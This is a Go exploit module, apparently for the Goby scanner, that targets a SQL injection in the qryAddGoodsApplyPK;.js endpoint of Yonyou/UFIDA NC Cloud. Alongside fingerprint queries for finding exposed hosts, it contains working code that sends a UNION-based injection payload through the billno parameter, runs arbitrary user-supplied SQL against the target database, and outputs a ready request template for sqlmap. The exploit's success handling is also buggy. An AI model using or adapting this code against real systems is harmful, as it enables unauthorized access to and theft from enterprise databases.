package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "UFIDA NC_Cloud /ebvp/other/qryAddGoodsApplyPK;.js SQL Injection Vulnerability",
    "Description": "<p>UFIDA NC Cloud refers to a large-scale enterprise digital platform launched by UFIDA. It supports flexible deployment modes of public cloud, hybrid cloud, and private cloud. The /ebvp/other/qryAddGoodsApplyPK;.js interface has a SQL injection vulnerability, which allows attackers to access data in the database without authorization and damage the system.</p>",
    "Product": "yonyou-U8",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-08-01",
    "PostTime": "2024-09-23",
    "Author": "2826161446@qq.com",
    "FofaQuery": "((body=\"html/downloadBroswer.html\" && body=\"platform/pub/welcome.do\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\"))",
    "GobyQuery": "((body=\"html/downloadBroswer.html\" && body=\"platform/pub/welcome.do\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\"))",
    "Level": "2",
    "Impact": "<p>The /ebvp/other/qryAddGoodsApplyPK;.js interface has a SQL injection vulnerability, which allows attackers to access data in the database without authorization and damage the system.</p>",
    "Recommendation": "<p>1. Reduce or avoid string concatenation toexecute SQL, and instead pass user input as a parameter to the SQL executionmethod   </p><p>2.Verify the value entered by the user</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT name FROM v$database",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "2H1W",
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "用友 NC Cloud /ebvp/other/qryAddGoodsApplyPK;.js SQL注入漏洞",
            "Product": "用友-U8",
            "Description": "<p>用友NC Cloud是指用友公司推出的大型企业数字化平台。支持公有云、混合云、专属云的灵活部署模式。其中/ebvp/other/qryAddGoodsApplyPK;.js接口存在 SQL注入漏洞，攻击者未经授权可以访问数据库中的数据，对系统造成破坏。</p>",
            "Recommendation": "<p>1.减少使用或不使用字符串拼接的方式执行SQL，而是将用户输入当着参数传给执行SQL的方法&nbsp;</p><p>&nbsp;2.对用户输入的值进行校验<br></p>",
            "Impact": "<p>其中/ebvp/other/qryAddGoodsApplyPK;.js接口存在 SQL注入漏洞，攻击者未经授权可以访问数据库中的数据，对系统造成破坏。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "两高一弱",
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "UFIDA NC_Cloud /ebvp/other/qryAddGoodsApplyPK;.js SQL Injection Vulnerability",
            "Product": "yonyou-U8",
            "Description": "<p>UFIDA NC Cloud refers to a large-scale enterprise digital platform launched by UFIDA. It supports flexible deployment modes of public cloud, hybrid cloud, and private cloud. The /ebvp/other/qryAddGoodsApplyPK;.js interface has a SQL injection vulnerability, which allows attackers to access data in the database without authorization and damage the system.<br></p>",
            "Recommendation": "<p>1. Reduce or avoid string concatenation toexecute SQL, and instead pass user input as a parameter to the SQL executionmethod &nbsp;&nbsp;</p><p>2.Verify the value entered by the user<br></p>",
            "Impact": "<p>The /ebvp/other/qryAddGoodsApplyPK;.js interface has a SQL injection vulnerability, which allows attackers to access data in the database without authorization and damage the system.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "2H1W",
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9956"
}`

	setSqlPayloadwV7lbsgw := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		defineHeader := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
			"Accept-Encoding": "gzip, deflate",
			"Connection":      "close",
		}

		rawPayload := fmt.Sprintf("1' UNION ALL SELECT (%s),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL-- vLrT", sql)
		urlget := "/ebvp/other/qryAddGoodsApplyPK;.js?billno=" + url.QueryEscape(rawPayload)
		resp, err = setGetRequest(hostInfo, urlget, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/ebvp/other/qryAddGoodsApplyPK;.js"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "qkzpqPsYpLQbuKduDlHyMbqNlZHSvGcfetDCtCLXTTJSlqxqkq"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "CHR(113)||CHR(107)||CHR(122)||CHR(112)||CHR(113)||CHR(80)||CHR(115)||CHR(89)||CHR(112)||CHR(76)||CHR(81)||CHR(98)||CHR(117)||CHR(75)||CHR(100)||CHR(117)||CHR(68)||CHR(108)||CHR(72)||CHR(121)||CHR(77)||CHR(98)||CHR(113)||CHR(78)||CHR(108)||CHR(90)||CHR(72)||CHR(83)||CHR(118)||CHR(71)||CHR(99)||CHR(102)||CHR(101)||CHR(116)||CHR(68)||CHR(67)||CHR(116)||CHR(67)||CHR(76)||CHR(88)||CHR(84)||CHR(84)||CHR(74)||CHR(83)||CHR(108)||CHR(113)||CHR(120)||CHR(113)||CHR(107)||CHR(113)"

			sendPayload := setSqlPayloadwV7lbsgw
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "GET /ebvp/other/qryAddGoodsApplyPK;.js?billno=1* HTTP/1.1\n" +
				"Host: " + expResult.HostInfo.HostInfo + "\n" +
				"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\n" +
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n" +
				"Accept-Encoding: gzip, deflate\n" +
				"Accept-Language: zh-CN,zh;q=0.9\n\n"

			sendPayload := setSqlPayloadwV7lbsgw
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" || attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}

				expResult.Success = true
				expResult.Output = resp.RawBody
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
